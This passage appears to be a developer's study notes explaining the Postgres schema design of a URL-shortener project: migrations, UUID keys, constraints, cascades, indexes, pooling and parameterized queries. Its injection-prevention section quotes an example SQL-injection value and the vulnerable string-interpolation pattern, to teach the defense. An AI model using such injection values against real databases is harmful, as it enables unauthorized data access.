(on by default) refuses to run a migration file whose timestamp is out of
order relative to what's already recorded — it assumes migrations are
applied in the order they were created, and flags anything that looks like
it was inserted retroactively out of sequence.

**Where it lives in the codebase.** Not in this repo's own schema code at
all — `pgmigrations` is created automatically by node-pg-migrate the first
time `migrate:up` runs against a given database, in the `public` schema
alongside `users`/`links`/`clicks`.

**Common pitfalls.**

- Renaming a migration file after it's already been applied somewhere —
  the recorded `name` no longer matches any file on disk, and
  `check-order` (or a teammate's fresh `migrate:up`) gets confused about
  what's actually been run.
- Manually deleting rows from `pgmigrations` to "re-run" a migration —
  this re-runs `up` against a database that already has the resulting
  schema, which usually fails loudly (e.g. "relation already exists") but
  could silently corrupt state if the migration isn't purely additive.
- Assuming `pgmigrations` is the same across every environment — it isn't
  shared; each database (dev, test, staging, prod) has its own copy and
  its own independently-tracked history, by design.

**Production considerations.** Because tracking lives inside the target
database, "has this migration run in production" is always answerable
with a direct query against production itself — no external record to
keep in sync. This is also why a migration step in a deploy pipeline is
generally safe to re-run: node-pg-migrate will see the previously-applied
migrations already recorded and skip them.

**Interview answer.** node-pg-migrate tracks its own history by creating a
`pgmigrations` table in the database it's migrating, recording each
applied migration's filename and timestamp. That's how it knows, on any
given run, which files are new versus already applied — it's asking the
database's own state, not trusting the filesystem or some external
record. It also means each environment's migration history is independent
and self-contained: what's been applied to dev tells you nothing about
what's been applied to production, which is exactly the isolation you
want.

---

### UUID primary keys vs serial — the enumeration/security tradeoff

**What it is.** Every table here uses `id uuid primary key default
gen_random_uuid()` instead of Postgres's traditional auto-incrementing
`serial`/`bigserial` integer primary key.

**Why it exists in this project.** `links.short_code` is only meaningful
as a public, guessable-resistant identifier if the underlying `id` doesn't
leak information — with a `serial` id, `/links/1043` next to `/links/1044`
tells an outside observer roughly how many links exist and lets them
enumerate every one by incrementing a number. UUIDs (122 bits of
randomness for v4) make that infeasible: there's no ordering or count to
infer, and no way to iterate "the next record" by guessing.

**How it works mechanically.** `gen_random_uuid()` is a Postgres built-in
function (native to core since Postgres 13, confirmed unnecessary to add
any extension for on this project's Postgres 16) that generates a random
version-4 UUID. Setting it as a column `default` means Postgres generates
the value at insert time if the application doesn't supply one — the same
pattern `serial`'s auto-increment uses, just backed by randomness instead
of a sequence counter.

**Where it lives in the codebase.** `id: { type: 'uuid', primaryKey: true,
default: pgm.func('gen_random_uuid()') }` in each of the three
`migrations/*.ts` files.

**Common pitfalls.**

- Generating UUIDs in application code instead of the database — it works,
  but then every insert path has to remember to do it, and a raw `INSERT`
  run from `psql` or a script that forgets would fail or silently rely on
  no default existing.
- Assuming UUIDs are free performance-wise — a random UUID primary key
  means new rows insert at random points in the primary key's B-tree index
  rather than always appending at the end (`serial` always inserts at the
  tail), which causes more index page splits under high insert volume than
  a sequential key would. Not a concern at this project's current scale,
  but a real, measurable cost at high write throughput.
- Confusing "not enumerable" with "not guessable everywhere" — UUIDs
  protect against sequential enumeration of internal ids, but
  `links.short_code` (the actual public-facing identifier) has its own,
  separate design consideration for how hard it should be to guess, not
  covered by the `id` column's UUID-ness at all.
- Requiring the `pgcrypto` or `uuid-ossp` extension unnecessarily — a
  common Postgres tutorial pattern from before `gen_random_uuid()` was
  built into core; on Postgres 13+ (this project targets 16) it's already
  available, so adding either extension here would be an unjustified
  dependency.

**Production considerations.** At very high write volume, some teams
switch to UUIDv7 (time-ordered UUIDs, standardized in 2024) specifically
to get sequential-ish insert locality back while keeping
non-enumerability — worth revisiting if `links`/`clicks` insert rate ever
makes B-tree fragmentation from `id`'s randomness a measured problem, not
a theoretical one.

**Interview answer.** I use database-generated UUIDs instead of serial
integers for primary keys specifically because this is a public-facing
API — a sequential id leaks how many records exist and lets anyone
enumerate every row by incrementing a number, which a random UUID makes
infeasible. The tradeoff is write performance at scale: sequential keys
always insert at the end of their index, while random UUIDs insert at
random points, causing more B-tree page splits under high volume. For this
project's current scale that cost isn't a concern; if it ever became one,
UUIDv7 (time-ordered, still non-sequential-looking) is the usual
middle-ground fix.

---

### CHECK constraints for cross-column business rules

**What it is.** A `CHECK` constraint is a boolean SQL expression attached
to a table that every row must satisfy — Postgres rejects any `INSERT` or
`UPDATE` that would make it false, with no way around it short of dropping
the constraint.

**Why it exists in this project.** A user must authenticate via exactly
one method: a local password, or an OAuth identity, never both, never
neither. That's not a single-column rule (`NOT NULL` can't express it —
it spans `password_hash`, `oauth_provider`, and `oauth_id` together), so it
needs a rule that can see all three columns on the same row at once.
Similarly, `links.max_clicks` being positive and `links.click_count` being
non-negative are invariants about what a valid row looks like, not
something any single column type can enforce alone.

**How it works mechanically.** `users_password_xor_oauth_check` is:

```sql
(password_hash IS NOT NULL AND oauth_provider IS NULL AND oauth_id IS NULL)
OR
(password_hash IS NULL AND oauth_provider IS NOT NULL AND oauth_id IS NOT NULL)
```

This is a true XOR — exactly one branch must be true — not just "at least
one of these is set," because a row with _both_ a password and an OAuth
identity has no defined precedence rule anywhere in the application, so
the schema simply refuses to let that state exist. Postgres evaluates this
expression against every candidate row on every insert/update and raises a
`check_violation` error (SQLSTATE `23514`) if it evaluates to false.

**Where it lives in the codebase.**
`users_password_xor_oauth_check` in `migrations/*_create-users-table.ts`;
`links_max_clicks_positive_check` and `links_click_count_non_negative_check`
in `migrations/*_create-links-table.ts`. Exercised directly in
`tests/db/constraints.test.ts`, asserting on the `23514` error code.

**Common pitfalls.**

- Writing "at least one" instead of true XOR — `(password_hash IS NOT NULL
OR oauth_provider IS NOT NULL)` would let a row have both set, silently
  leaving an ambiguous state the rest of the application has to guard
  against anyway, defeating the point of enforcing it here.
- Forgetting that `CHECK` constraints don't fire on columns not mentioned
  in an `UPDATE` — they re-validate the _entire row_ on every write, so
  this is a non-issue for correctness, but worth knowing when reasoning
  about how often a given constraint actually gets evaluated.
- Relying only on this check and never testing it — an untested constraint
  can silently stop matching what the application actually inserts after a
  refactor, and the failure mode (a legitimate insert suddenly rejected in
  production) is worse than not having the constraint enforced strictly at
  all.

**Production considerations.** `CHECK` constraints are validated on every
write, so they have a real (small) cost — for the constraints in this
schema, a handful of `IS NULL` comparisons per row, negligible compared to
the write itself. Adding a `CHECK` constraint to an _existing_, populated
table is a heavier operation in production: Postgres has to scan the whole
table to verify every existing row satisfies the new rule before it can
add the constraint (unless added as `NOT VALID` and validated separately,
a technique for large tables not needed here since these tables start
empty).

**Interview answer.** `CHECK` constraints let the database itself enforce
rules that span multiple columns on the same row — here, that a user has
exactly one authentication method, and that `links.click_count`/
`max_clicks` stay within valid ranges. I wrote the auth rule as a true
XOR rather than "at least one," because a row satisfying both conditions
would have no defined meaning anywhere downstream, and the schema is the
right place to make that state simply impossible rather than trusting
every future code path to check for it.

---

### NULL semantics in UNIQUE constraints

**What it is.** In standard SQL, `NULL` is never considered equal to
another `NULL` — including for the purposes of a `UNIQUE` constraint. Two
rows that both have `NULL` in a uniquely-constrained column don't violate
uniqueness, because SQL never actually compares them as "equal."

**Why it exists in this project.** `users` has a `UNIQUE(oauth_provider,
oauth_id)` constraint meant to stop two different user rows from claiming
the same OAuth identity. But most users in this schema are password-only,
meaning both `oauth_provider` and `oauth_id` are `NULL` for them — and
there can be arbitrarily many such users. If `NULL` uniqueness worked like
"any two nulls are duplicates," only one password-only user could ever
exist, which would obviously be wrong.

**How it works mechanically.** Because Postgres (following the SQL
standard) treats `NULL <> NULL`, the unique constraint only actually
fires when comparing two rows that both have _non-null_ values in
`oauth_provider` and `oauth_id` — exactly the case of two different users
claiming the same real OAuth identity, which is the one case this
constraint is meant to prevent. Every password-only row, with both
columns `NULL`, is simply never compared as a duplicate of any other
password-only row.

**Where it lives in the codebase.** `users_oauth_identity_unique` in
`migrations/*_create-users-table.ts`, added as a plain
`pgm.addConstraint('users', ..., { unique: ['oauth_provider', 'oauth_id'] })`
— no partial index (`WHERE oauth_provider IS NOT NULL`) needed, since the
plain constraint already behaves correctly for exactly this reason.

**Common pitfalls.**

- Assuming a plain `UNIQUE` constraint would block multiple `NULL` rows —
  a genuinely common misconception (it doesn't, in every mainstream SQL
  database including Postgres), which leads people to reach for a partial
  index defensively when it isn't needed.
- The opposite mistake: relying on `NULL <> NULL` uniqueness semantics
  somewhere they _don't_ want it — e.g. expecting a `UNIQUE(email)`
  constraint to block a second row with a `NULL` email, when it wouldn't
  (this project sidesteps the issue since `email` is `NOT NULL`).

**Production considerations.** This is a Postgres/SQL-standard behavior,
not a Click Scope-specific choice — it's worth knowing cold, since it
comes up any time a nullable column participates in a uniqueness rule,
which is common in schemas with optional identity/linking columns like
this one.

**Interview answer.** SQL treats `NULL` as never equal to `NULL`, even
inside a `UNIQUE` constraint — so a plain `UNIQUE(oauth_provider,
oauth_id)` still allows unlimited rows where both columns are `NULL`, and
only actually blocks two rows that both have the _same non-null_ values.
That's exactly the behavior this schema needs: password-only users (both
columns null) should coexist freely, while two users claiming the same
real OAuth identity should not — so the plain constraint is sufficient on
its own, with no partial index required.

---

### Case-insensitive uniqueness: functional index vs citext vs app-level lowercasing

**What it is.** Three different ways to make `foo@bar.com` and
`Foo@Bar.com` collide as "the same email" for uniqueness purposes: a
functional (expression) unique index on `lower(email)`; the `citext`
extension, which makes an entire column type case-insensitive; or trusting
application code to lowercase every email before it's written or queried.

**Why it exists in this project.** Users will sign in by email, typed by
hand — case shouldn't matter for whether an email is a duplicate.
`email text` alone with a plain `UNIQUE` constraint compares byte-for-byte,
so it would let `dev@example.com` and `Dev@Example.com` register as two
different accounts.

**How it works mechanically.** This project uses a functional unique
index: `CREATE UNIQUE INDEX ON users (lower(email))`. Postgres evaluates
`lower(email)` for every row and indexes _that_ value, so the uniqueness
check compares lowercased values regardless of what case was actually
stored. `citext` (a Postgres extension) would instead change the column's
type entirely, making every comparison, sort, and `LIKE` on that column
implicitly case-insensitive everywhere it's used, not just for uniqueness.
App-level lowercasing means always calling `.toLowerCase()` before an
insert or `WHERE email = $1` query — enforced by discipline, not the
database.

**Where it lives in the codebase.**
`users_email_lower_unique_idx` in `migrations/*_create-users-table.ts`.

**Common pitfalls.**

- Choosing `citext` without wanting its full scope of behavior change —
  it's not just "unique index, but case-insensitive"; every future query,
  `ORDER BY`, and `LIKE` against that column silently becomes
  case-insensitive too, which is a bigger, harder-to-reason-about surface
  than this project's actual requirement (uniqueness only).
- Relying purely on app-level lowercasing — it only protects paths that
  remember to do it. A migration, a seed script, an admin tool, or a
  future teammate's raw `INSERT` can all bypass it, and the database has
  no way to catch the resulting duplicate.
- Using `ON CONFLICT (email)` for upserts against this schema — it won't
  work, because the actual unique index is on the _expression_
  `lower(email)`, not the bare `email` column; `scripts/seed.ts` handles
  this with an explicit `WHERE lower(email) = lower($1)` existence check
  instead.

**Production considerations.** Application code should still normalize
email to lowercase on write and lookup, for consistency (so a query for
`Foo@Bar.com` finds the row even before hitting the index, and so stored
values look uniform) — but the functional index is what actually
_guarantees_ no duplicate can exist, regardless of whether every code path
remembers to normalize.

**Interview answer.** I enforce case-insensitive email uniqueness with a
functional unique index on `lower(email)`, rather than the `citext`
extension or trusting application code to lowercase consistently. `citext`
changes the column's comparison semantics everywhere it's used, which is
more behavior change than a single uniqueness rule needs; app-level
lowercasing only protects code paths that remember to call it, and the
database can't catch a duplicate that slips through a path that doesn't.
A functional index gets the guarantee at the one layer that can't be
bypassed, at the cost of needing to remember `ON CONFLICT`/lookup queries
have to match on the same expression, not the bare column.

---

### Foreign keys and ON DELETE CASCADE

**What it is.** A foreign key is a constraint saying "this column's value
must exist as a primary key value in another table." `ON DELETE CASCADE`
extends that: when the referenced row is deleted, Postgres automatically
deletes every row that referenced it too, rather than leaving them
pointing at nothing or blocking the delete.

**Why it exists in this project.** `links.user_id` must always point at a
real user, and `clicks.link_id` must always point at a real link — a link
"owned by" a nonexistent user, or a click recorded against a nonexistent
link, is meaningless application state. `ON DELETE CASCADE` on both
matches the intended product behavior directly: deleting a user's account
should remove their links, and deleting a link should remove its click
history, without the application having to orchestrate that deletion
order itself.

**How it works mechanically.** Declared at the column level in each
migration — `user_id: { references: 'users', onDelete: 'CASCADE' }` on
`links`, `link_id: { references: 'links', onDelete: 'CASCADE' }` on
`clicks`. Postgres physically enforces this: a `DELETE FROM users WHERE
id = $1` triggers Postgres itself to find and delete every matching row in
`links` first (and, transitively, every `clicks` row referencing those
links), inside the same transaction as the original delete, before the
delete completes. There's no way to bypass this from the application layer
short of dropping the constraint.

**Where it lives in the codebase.** The `references`/`onDelete` fields on
`links.user_id` and `clicks.link_id` in their respective migration files.
Verified directly in `tests/db/constraints.test.ts`'s "ON DELETE CASCADE"
test — insert a user, a link, and a click, delete the user, assert both
descendant rows are gone.

**Common pitfalls.**

- Assuming cascade delete is "safe by default" for every relationship — it
  is here because the product behavior genuinely wants a full cascade, but
  the same pattern applied carelessly (e.g. deleting a
  frequently-referenced lookup row) can wipe out far more data than
  intended. `ON DELETE CASCADE` should always be a deliberate choice per
  relationship, never a default habit.
- Forgetting that cascades run inside the deleting transaction — a cascade
  touching millions of dependent rows (not a concern at this project's
  current scale) can turn a single-row delete into a slow, lock-heavy
  operation.
- Not indexing the foreign key column (see the next section) — Postgres
  still enforces the cascade correctly without an index, just by scanning
  the whole dependent table to find matching rows, which gets slow as that
  table grows.

**Production considerations.** Cascading deletes are convenient but
irreversible and untraceable after the fact — there's no built-in audit
trail of "this delete cascaded and removed these N rows." For anything
where that history matters (e.g. compliance, dispute resolution), a
soft-delete pattern (a `deleted_at` column, filtered out at the query
layer) is the usual alternative — not needed for this project yet, but
worth knowing as the tradeoff being made now.

**Interview answer.** A foreign key guarantees referential integrity — a
column's value must exist as a primary key elsewhere — and `ON DELETE
CASCADE` extends that so deleting the referenced row automatically deletes
every dependent row too, enforced physically by the database inside the
same transaction. I used it for both `users → links` and `links → clicks`
because that matches the actual product behavior: deleting an account
should remove that account's links, and deleting a link should remove its
click history, without the application having to manually orchestrate
delete order or risk leaving orphaned rows if it forgets a step.

---

### Constraints vs. application-level checks

**What it is.** The same rule — "this email must be unique," "this user
must have a password or an OAuth identity" — can be enforced either inside
the database (a constraint) or in application code (a check-then-write, an
`if` statement before an `INSERT`). They are not equivalent, even when
they express the identical rule.

**Why it exists in this project.** CLAUDE.md's non-negotiable conventions
already require every constraint in this schema to be enforced at the
database level, not just checked in application code — this section is
about _why_ that's the actual rule, not merely a style preference.

**How it works mechanically — the race condition app-level checks can't
close.** Consider an app-level uniqueness check implemented as "look up
whether this email already exists, and only insert if it doesn't":

```
1. SELECT id FROM users WHERE lower(email) = lower($1)   -- request A
2. SELECT id FROM users WHERE lower(email) = lower($1)   -- request B, concurrently
3. (both see: no existing row)
4. INSERT ... (request A)                                 -- succeeds
5. INSERT ... (request B)                                 -- also succeeds!
```

If both requests run their `SELECT` before either has run its `INSERT`,
both see "no existing user" and both proceed to insert — two duplicate
accounts, from code that looks like it prevents exactly that. This isn't a
hypothetical: two signup requests for the same email arriving within
milliseconds of each other (a double-click, a retried request, a bot) hit
this window in practice. A database-level `UNIQUE` constraint has no such
window — even if both `INSERT`s run concurrently, Postgres guarantees only
one can actually commit; the second gets a `unique_violation` error at the
database level, unconditionally, regardless of what either request's
application code checked beforehand.

**Where it lives in the codebase.** Every constraint in
`migrations/*.ts` (the `UNIQUE` indexes, the `CHECK` constraints, the
foreign keys) is the actual enforcement; nothing in this phase relies on
an application-level check as its only guard.

**Common pitfalls.**

- Treating an app-level check as sufficient "because it's fast" or
  "because we validate in the route already" — validation at the route
  boundary (this project's Zod schemas, in later phases) is about
  rejecting obviously malformed input early and cheaply, not about
  guaranteeing uniqueness or cross-row invariants, which require the
  database's transactional guarantees to be race-free.
- Only discovering the race in production, under real concurrent load —
  it's very easy to write and manually test an app-level check that looks
  correct, because manual testing rarely fires two requests within the
  same millisecond.

**Production considerations.** This is precisely the class of bug that
"works in every test, fails once a month in production under real
traffic" — intermittent, hard to reproduce, and easy to misdiagnose as
something else (a caching bug, a client-side double-submit) unless the
underlying cause (a check-then-write race) is understood.

**Interview answer.** An application-level uniqueness check —query for an
existing row, then insert if none is found — has an unavoidable race
condition under concurrent requests: two requests can both query, both see
no existing row, and both insert, because there's a window between the
check and the write where neither request knows about the other's
in-flight operation. A database-level `UNIQUE` constraint closes that
window entirely, because the database guarantees only one of two
concurrent inserts can actually commit, independent of what either
request checked beforehand. That's why constraints belong in the schema,
not just in application code — it's not a style preference, it's the
difference between a rule that's actually always true and one that's true
except under a specific, hard-to-reproduce timing condition.

---

### timestamptz vs. timestamp

**What it is.** Postgres has two similar-looking timestamp types:
`timestamp` (officially `timestamp without time zone`) stores a date and
time with no timezone information at all — just a naive clock reading.
`timestamptz` (`timestamp with time zone`) stores an absolute instant:
internally, Postgres always keeps it as UTC, converting to/from whatever
session timezone is in effect only for display.

**Why it exists in this project.** Every timestamp column in this schema
(`created_at`, `updated_at`, `clicked_at`) is `timestamptz`, with no
exceptions. A click's `clicked_at` needs to represent one unambiguous
moment regardless of what timezone the application server, the database
server, or a future analytics job happens to be running in — sorting
clicks chronologically, or comparing "was this within the last hour," has
to be correct no matter where any of those processes are deployed.

**How it works mechanically.** With `timestamp`, `'2026-03-05
14:00:00'` means different real-world instants depending on who's reading
it — 2pm in what timezone? Nothing in the stored value says. With
`timestamptz`, Postgres stores the UTC-normalized instant internally
(regardless of what timezone the value was inserted with) and only
converts on the way _out_, based on the connecting session's `timezone`
setting — so the stored value is always the same absolute point in time,
and only its textual _display_ changes.

**Where it lives in the codebase.** `created_at`/`updated_at` on `users`
and `links`, `clicked_at` on `clicks` — all `timestamptz not null default
now()` in their respective migration files.

**Common pitfalls.**

- Using `timestamp` because it "looks simpler" — it defers the timezone
  problem rather than avoiding it; the moment the application server, the
  database, or a downstream consumer runs in a different timezone (or a
  server's timezone config silently changes), stored `timestamp` values
  become ambiguous or wrong without any error ever being raised.
- Assuming `timestamptz` "stores the timezone" — it doesn't store a
  timezone label at all; it stores UTC and converts for _display_ only.
  Two rows inserted from different timezones with the same real-world
  instant store as the identical value.
- Comparing/sorting a mix of `timestamp` and `timestamptz` values across
  tables — Postgres will implicitly convert using the session's timezone,
  which can silently produce wrong comparisons if that assumption isn't
  understood.

**Production considerations.** `timestamptz` is close to a
default-always-correct choice for anything sorted, compared, or persisted
across regions or process restarts — the mental model "always
`timestamptz` unless you have a specific reason not to" holds up well in
practice and avoids an entire class of subtle, hard-to-reproduce
timezone bugs.

**Interview answer.** `timestamptz` stores an absolute instant — Postgres
normalizes it to UTC internally and only converts for display based on the
session's timezone — while plain `timestamp` stores a naive clock reading
with no timezone information at all, which becomes ambiguous the moment
more than one timezone is involved anywhere in the system. I use
`timestamptz` for every timestamp column in this schema because sorting
and comparing timestamps (when did this click happen, relative to another)
has to be correct regardless of what timezone any given process is
running in, and `timestamp` just defers that problem instead of solving
it.

---

### Nullable columns as domain modeling

**What it is.** Whether a column is declared `NOT NULL` or left nullable
isn't just a data-integrity nicety — it's a direct statement about what
states are valid for a row to be in.

**Why it exists in this project.** `users.password_hash` is nullable
specifically because a valid user can exist with no password at all — an
OAuth-only user. Making it `NOT NULL` would either be factually wrong (it
would force every OAuth user to have _some_ password value, even a
meaningless placeholder) or would require a separate table/split schema
just to represent two different kinds of "valid user." A nullable column,
paired with the CHECK constraint enforcing exactly one auth method, models
the real domain accurately: "this field may legitimately be absent for
some valid rows" without needing to invent a fake non-null placeholder.

**How it works mechanically.** Every column in this schema was decided
individually: `NOT NULL` where the row is genuinely incomplete/invalid
without it (`email`, `short_code`, `destination_url`, all four
timestamp columns), nullable where the field's absence is itself
meaningful domain state (`password_hash`/`oauth_provider`/`oauth_id` on
`users`; `password_hash`/`expires_at`/`max_clicks` on `links`, where
`NULL` specifically means "no password gate" / "never expires" /
"unlimited clicks" — not "unknown" or "not yet set").

**Where it lives in the codebase.** Every `ColumnDefinition` across the
three `migrations/*.ts` files — `notNull: true` is explicit wherever a
column requires it, and simply absent (defaulting to nullable) wherever
the domain allows a legitimate absence.

**Common pitfalls.**

- Defaulting everything to `NOT NULL` "to be safe" — this often just
  forces a meaningless placeholder value into existence (an empty string,
  a sentinel date) instead of letting `NULL` represent "genuinely not
  applicable," which then has to be special-cased everywhere the column is
  read.
- Defaulting everything to nullable "to avoid insert errors" — this hides
  genuine bugs (a required field silently missing) behind a schema that
  can't tell the difference between "not applicable" and "forgot to set
  it."
- Conflating "nullable" with "optional in the API" — a column can be
  `NOT NULL` in the database while still being optional in a request body,
  if the application supplies a sensible default before the insert; the
  two concerns (schema validity, API ergonomics) are related but not the
  same decision.

**Production considerations.** Getting nullability right up front matters
more than most schema decisions, because changing a column from nullable
to `NOT NULL` later requires either backfilling every existing `NULL` row
or deciding what to do with them — a migration that's easy on an empty
table and can be genuinely difficult on a large, populated one.

**Interview answer.** I treat nullable-vs-not-null as a domain modeling
decision, not just a data-integrity default. `password_hash` is nullable
specifically because a valid user can legitimately have no password — an
OAuth-only account — and forcing it to `NOT NULL` would mean inventing a
meaningless placeholder value just to satisfy the schema. The rule I use
is: `NOT NULL` where a row is genuinely incomplete without the field,
nullable where the field's absence is itself valid, meaningful state —
not "unknown," but "legitimately not applicable" — which is exactly what
`NULL` is for.

---

### Indexes: what they cost on writes, and which ones constraints create for free

**What it is.** An index is a separate, ordered data structure Postgres
maintains alongside a table specifically to make certain lookups fast
without scanning every row. Every index also has a cost: every `INSERT`,
`UPDATE`, or `DELETE` on the table has to update every index on it too,
not just the table's own storage.

**Why it exists in this project.** This phase deliberately adds only two
indexes beyond what constraints create automatically — `links(user_id)`
and `clicks(link_id)` — each justified by a specific, real query pattern
this schema implies, not spec­ulatively. Every other index that was
considered (`clicks.clicked_at`, `links.expires_at`, `links.is_active`)
was explicitly rejected for now, since no route in this phase actually
queries by those columns yet, and an unused index is pure write-cost with
no compensating read benefit.

**How it works mechanically.** Postgres automatically creates a matching
index for every `PRIMARY KEY` and every `UNIQUE` constraint (including the
functional `lower(email)` unique index) — those aren't optional or
separately requested; the index is _how_ the constraint is enforced
efficiently. What Postgres does **not** do automatically is index foreign
key columns — `links.user_id` and `clicks.link_id` need an explicit
`pgm.createIndex(...)` call, or two very common query patterns ("list a
user's links," "list a link's clicks" — plus every `ON DELETE CASCADE`
that has to find matching dependent rows) fall back to a full table scan
as the table grows.

**Where it lives in the codebase.** `pgm.createIndex('links', 'user_id')`
in `migrations/*_create-links-table.ts`; `pgm.createIndex('clicks',
'link_id')` in `migrations/*_create-clicks-table.ts`. Each migration
file has an explicit comment noting which indexes were considered and
rejected, and why — so a future reader knows they were deliberately
deferred, not overlooked.

**Common pitfalls.**

- Assuming a foreign key is automatically indexed because it's constrained
  — Postgres validates the _reference_ on write (does the row exist in the
  parent table), which doesn't require an index on the child column at
  all; it's a genuinely separate decision from whether that column is fast
  to _query by_, and a surprisingly common gotcha even among experienced
  Postgres users.
- Adding an index "because it might be useful later" — every unused index
  is a real, ongoing cost (slower writes, more disk space, more
  vacuum/maintenance work) with zero benefit until a query actually uses
  it; this project's own convention (justify from an actual query pattern,
  not a guess) exists specifically to avoid this.
- Forgetting that adding an index to a large, already-populated table in
  production is itself an operation with real cost/locking implications
  (mitigated by `CREATE INDEX CONCURRENTLY`, not needed here since these
  tables start empty).

**Production considerations.** Phase 12 of this project is explicitly
reserved as a dedicated, measurement-driven indexing pass — once there are
real routes and real query patterns (and ideally `EXPLAIN ANALYZE` output
from production-like data volumes), that's when `clicked_at` and similar
columns get revisited, backed by evidence instead of speculation.

**Interview answer.** Every index speeds up specific reads at the cost of
slowing down every write to that table, so I only add one when I can name
the exact query it serves. Postgres creates indexes automatically for
primary keys and unique constraints — that's not optional, it's how those
constraints are enforced — but it does _not_ automatically index foreign
key columns, which is a common gotcha since people often assume "this
column is constrained" implies "this column is indexed." I added indexes
on `links.user_id` and `clicks.link_id` specifically because those serve
real, known query patterns (and the cascading deletes), and deliberately
left out anything I couldn't point to an actual query for yet — that's a
measurement-driven pass reserved for later, not a guess made now.

---

### Connection pooling

**What it is.** Opening a new TCP connection and authenticating to
Postgres for every single query is slow — a connection pool keeps a small
set of already-authenticated connections open and hands them out to
whichever query needs one next, reusing them instead of paying that setup
cost repeatedly.

**Why it exists in this project.** Every request this API eventually
serves will need to run at least one database query; without pooling,
each request would pay full connection-setup latency on top of the
query's own latency, and the application would have no control over how
many concurrent connections it opens against Postgres (which has its own
hard connection ceiling).

**How it works mechanically.** `src/db/pool.ts` constructs a single
`pg.Pool` at module load time, shared by the whole process. Sizing and
timeout tradeoffs, each a deliberate choice rather than a default:

- **`max: 10`** — this is one long-running Express process, not a
  serverless function spinning up a fresh pool per invocation. Local
  Postgres defaults to `max_connections: 100`, so 10 leaves headroom for
  `psql`, other local tooling, and the separate worker process's own pool.
  In production (Supabase), the Supavisor pooler multiplexes connections
  server-side, so this number just needs to be modest — Supavisor's own
  limits are the real ceiling to watch, not Postgres's raw
  `max_connections`.
- **`connectionTimeoutMillis: 5000`** — how long a query will wait for a
  connection to become available (or for a new one to establish) before
  giving up. Long enough to survive a brief network blip to a remote
  database, short enough that a genuinely broken database fails a request
  fast instead of hanging it indefinitely.
- **`idleTimeoutMillis: 30000`** — how long an idle connection sits in the
  pool before being closed. Balances not thrashing new connections under
  bursty traffic against not holding connections open against Supavisor
  longer than actually needed.

**Where it lives in the codebase.** `src/db/pool.ts` — the `pool` export
and the `query()` helper wrapping it; `src/server.ts`'s `shutdown`
function calls `pool.end()`.

**Common pitfalls.**

- Creating a new `Pool` per request or per module instead of one shared
  instance — defeats the entire purpose, since each pool independently
  opens its own connections up to its own `max`, multiplying real
  connection count with no coordination between them.
- Not handling the pool's `'error'` event — `pg.Pool` emits `'error'` on
  an _idle_ client (e.g. the database restarts, silently killing a
  connection nobody is actively using) completely independently of any
  query in flight. Without a listener, this is an unhandled `'error'`
  event, which crashes the Node process outright — a genuinely common,
  easy-to-miss `pg` gotcha, addressed here by wiring it to the shared Pino
  `logger`.
- Sizing the pool arbitrarily large "to be safe" — a bigger pool doesn't
  make Postgres faster; past a certain point it just means more idle
  connections consuming memory on the database server for no throughput
  benefit, and can push a shared database past its own connection ceiling
  faster than expected once multiple app instances are running.

**Production considerations — pool exhaustion.** If every one of the
pool's `max` connections is checked out (in use by in-flight queries) and
a new query comes in, that query waits up to
`connectionTimeoutMillis` for one to free up, then throws a timeout error
if none does. This is the practical failure mode of "the database is too
slow" or "too many concurrent requests" — not necessarily Postgres itself
being overloaded, but this process's own pool being fully checked out. In
production, this shows up as a spike in `connectionTimeoutMillis`-flavored
errors in logs, request latency climbing right before those errors start,
and (with proper instrumentation) a pool utilization metric sitting at
`max` for a sustained period — the concrete signal to watch for and alert
on, once this project has real production traffic and metrics.

**Interview answer.** A connection pool keeps a small set of
already-authenticated database connections open and reuses them across
requests, instead of paying full connection setup cost per query. I sized
this pool at `max: 10` reasoning from the actual deployment shape — one
long-running process, not serverless, with a managed Postgres pooler
(Supavisor) doing the heavier multiplexing in production — rather than
picking an arbitrary number. Pool exhaustion, where every connection is
checked out and a new query has to wait, is the practical failure mode to
watch for in production: it shows up as request latency climbing and then
connection-timeout errors, and is usually a sign of either genuinely too
much concurrent load or a slow query holding connections longer than it
should, not necessarily Postgres itself being at capacity.

---

### Parameterized queries: protocol-level injection prevention

**What it is.** Passing query parameters as a separate array (`query('...
WHERE email = $1', [email])`) rather than building the SQL string by
concatenating or interpolating values directly into it.

**Why it exists in this project.** CLAUDE.md requires this without
exception — every query in `src/db/pool.ts`'s `query()` helper, every
query in `scripts/seed.ts`, every query in the test suite, uses
`$1`/`$2`/... placeholders with a separate values array. This isn't a
style preference; it's the mechanism that makes SQL injection structurally
impossible for these queries, not just unlikely.

**How it works mechanically.** With string concatenation, a value is
spliced directly into the SQL text before the database ever sees it — if
that value contains SQL syntax (a `'` followed by more SQL), the database
has no way to tell "user-supplied data" from "part of the command," and
executes whatever the resulting string says. Parameterized queries work
completely differently, at the wire protocol level: the query text
(`SELECT * FROM users WHERE email = $1`) and the parameter values
(`['attacker" OR "1"="1']`) are sent to Postgres as two _separate_ pieces
in the protocol message. Postgres parses and plans the query text alone
first — parameters are never substituted into the SQL string at all, on
either the client or server side — and only afterward binds the parameter
values into the already-fixed query plan as pure data. A malicious string
can't "become" SQL syntax because it's never in a position where it could
be parsed as SQL in the first place — the query structure was already
fixed before the value was ever involved. This is a fundamentally
different guarantee than escaping (sanitizing a string so any embedded
quotes are neutralized before concatenation), which still trusts the
string-building step to be implemented, and enabled, correctly every
single time.

**Where it lives in the codebase.** The `query()` function in
`src/db/pool.ts` and every one of its callers so far
(`scripts/seed.ts`, `tests/db/*.test.ts`) — the `text` argument is always
a static string with `$n` placeholders, `params` always carries the actual
values, never the other way around.

**Common pitfalls.**

- Using template literals to build query text with a value spliced in
  (`` `SELECT * FROM users WHERE email = '${email}'` ``) — even when the
  value "looks safe" in every test case tried, this is exactly the pattern
  that's exploitable the moment an untrusted value contains a `'`.
  reintroduces the exact vulnerability parameterization exists to close.
- Believing escaping functions are an equivalent substitute — they can be
  implemented correctly, but they have to be remembered and applied
  consistently at every single call site; parameterized queries make the
  safe path the _only_ path, structurally, rather than relying on
  discipline.
- Table/column names can't be parameterized this way at all (`$1` only
  works for values, not identifiers) — `tests/globalSetup.ts`'s
  `CREATE DATABASE "${dbName}"` is a deliberate, narrow exception, safe
  only because `dbName` comes from this project's own `.env.test` config,
  never from request input.

**Production considerations.** This is the single most important defense
against SQL injection, one of the OWASP Top 10 vulnerability classes, and
it's cheap: the `pg` driver supports parameterized queries natively, so
there's no performance or ergonomics tradeoff to justify skipping it
anywhere.

**Interview answer.** Parameterized queries prevent SQL injection at the
wire protocol level, not by sanitizing strings. The query text and the
parameter values are sent to Postgres as two separate pieces — Postgres
parses and plans the query structure first, with parameters as
